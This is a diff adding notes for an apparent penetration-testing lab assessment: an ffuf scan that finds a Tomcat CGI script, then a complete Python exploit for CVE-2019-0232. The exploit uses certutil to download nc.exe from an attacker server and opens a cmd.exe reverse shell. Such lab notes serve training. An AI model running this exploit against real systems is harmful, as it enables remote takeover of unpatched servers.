@@ -239,6 +239,48 @@ Accept-Language: en-US,en;q=0.9
 Connection: close
 ```
 ---
+### Attacking Common Applications:
+---
+#### Skills Assessment I:
+
+##### Finding a CGI script:
+```
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.201.89:8080/cgi/FUZZ.bat
+<SNIP>
+cmd                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 124ms]
+<SNIP>
+```
+###### Fixing the exploit (https://github.com/jaiguptanick/CVE-2019-0232/blob/main/CVE-2019-0232.py):
+```
+#!/usr/bin/env python3
+import time
+import requests
+host='10.129.201.x'#add host to connect
+port='8080'#add port of host {default:8080}
+server_ip='10.10.15.x'#server that has nc.exe file to get reverse shell
+server_port='8000'
+nc_ip='10.10.15.x'
+nc_port='1234'
+url1 = host + ":" + str(port) + "/cgi/cmd.bat?" + "&&C%3a%5cWindows%5cSystem32%5ccertutil+-urlcache+-split+-f+http%3A%2F%2F" + server_ip + ":" + server_port + "%2Fnc%2Eexe+nc.exe"
+url2 = host + ":" + str(port) + "/cgi/cmd.bat?&nc.exe+" + server_ip + "+" + nc_port + "+-e+cmd.exe"
+try:
+    requests.get("http://" + url1)
+    time.sleep(2)
+    requests.get("http://" + url2)
+    print(url2)
+except:
+    print("Some error occured in the script")
+```
+
+
+
+
+
+
+
+
+
+---
 ### Linux Priv Esc:
 ---
 #### Skills Assessment I:
